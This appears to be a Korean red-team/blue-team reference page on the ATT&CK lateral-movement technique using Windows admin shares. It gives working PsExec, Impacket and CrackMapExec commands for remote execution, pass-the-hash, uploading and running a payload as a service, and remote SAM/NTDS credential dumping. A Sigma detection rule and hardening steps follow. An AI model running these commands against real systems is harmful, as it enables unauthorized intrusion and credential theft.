# T1021.002 — SMB/Windows Admin Shares

## 개요

**TA0008 / T1021.002**  
Windows 관리 공유(ADMIN$, C$, IPC$)를 통해 원격 명령 실행 및 파일 전송을 수행하는 기법입니다. PsExec, Impacket 등을 이용해 유효한 자격증명으로 원격 시스템에 접근하고 명령을 실행합니다.

---

## 동작 방식

1. 대상 시스템에 유효한 자격증명으로 SMB 연결 수립
2. ADMIN$ 또는 C$ 공유에 실행 파일 업로드
3. SCM(Service Control Manager)을 통해 원격 서비스 생성 및 실행
4. 명령 결과를 IPC$를 통해 반환

**주요 활용 도구:**
- PsExec (Sysinternals)
- Impacket (psexec.py, smbexec.py, wmiexec.py)
- CrackMapExec
- 수동 net use + sc create

---

## 주요 커맨드 / 실습

### PsExec
```cmd
# 원격 명령 실행
PsExec.exe \\192.168.1.10 -u administrator -p 'Password123!' cmd.exe

# SYSTEM으로 실행
PsExec.exe \\192.168.1.10 -u administrator -p 'Password123!' -s cmd.exe

# 파일 복사 후 실행
PsExec.exe \\192.168.1.10 -u administrator -p 'Password123!' -c payload.exe
```

### Impacket
```bash
# psexec.py - ADMIN$ 경유 서비스 생성
python3 psexec.py administrator:'Password123!'@192.168.1.10

# smbexec.py - ADMIN$ 없이 C$ 사용
python3 smbexec.py administrator:'Password123!'@192.168.1.10

# wmiexec.py - WMI 활용 (파일리스)
python3 wmiexec.py administrator:'Password123!'@192.168.1.10

# NTLM 해시 사용
python3 psexec.py administrator@192.168.1.10 -hashes aad3b435b51404ee:ntlmhash

# secretsdump - 원격 SAM/NTDS 덤프
python3 secretsdump.py administrator:'Password123!'@192.168.1.10
```

### CrackMapExec
```bash
# 원격 명령 실행
crackmapexec smb 192.168.1.10 -u administrator -p 'Password123!' -x "whoami"

# PowerShell 명령 실행
crackmapexec smb 192.168.1.10 -u administrator -p 'Password123!' -X "Get-Process"

# 서브넷 전체에 명령 실행
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123!' -x "net localgroup administrators"
```

### 수동 net use + sc create
```cmd
# 공유 폴더 마운트
net use \\192.168.1.10\C$ 'Password123!' /user:administrator

# 악성 파일 복사
copy payload.exe \\192.168.1.10\C$\Windows\Temp\

# 원격 서비스 생성 및 시작
sc \\192.168.1.10 create malservice binpath= "C:\Windows\Temp\payload.exe"
sc \\192.168.1.10 start malservice

# 정리
sc \\192.168.1.10 stop malservice
sc \\192.168.1.10 delete malservice
net use \\192.168.1.10\C$ /delete
```

## 탐지 방법

### Sigma Rule
```yaml
title: Suspicious Access to Administrative Shares
id: c8a5f2e3-7b4d-4e9a-b6c1-3f8d5e2a7c4b
status: stable
description: Detects access to administrative shares from non-machine accounts
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5140
        ShareName|contains:
            - 'ADMIN$'
            - 'C$'
            - 'IPC$'
    filter:
        SubjectUserName|endswith: '$'
    condition: selection and not filter
falsepositives:
    - Legitimate administrative tools (SCCM, Ansible, etc.)
    - Backup software
level: medium
tags:
    - attack.lateral_movement
    - attack.t1021.002
```

---

## 대응 방안

1. 관리 공유(ADMIN$, C$) 비활성화 (필요한 경우에만 활성화)
2. SMB 포트(445/tcp)를 호스트 간 방화벽으로 세그멘테이션
3. PsExec 실행 파일 화이트리스트 정책 적용 (AppLocker)
4. 관리 공유 접근 감사 로그(EventID 5140, 5145) 활성화
5. LAPS로 로컬 관리자 계정 패스워드 다양화 (동일 패스워드 횡이동 방지)
6. SMB 서명 필수 적용
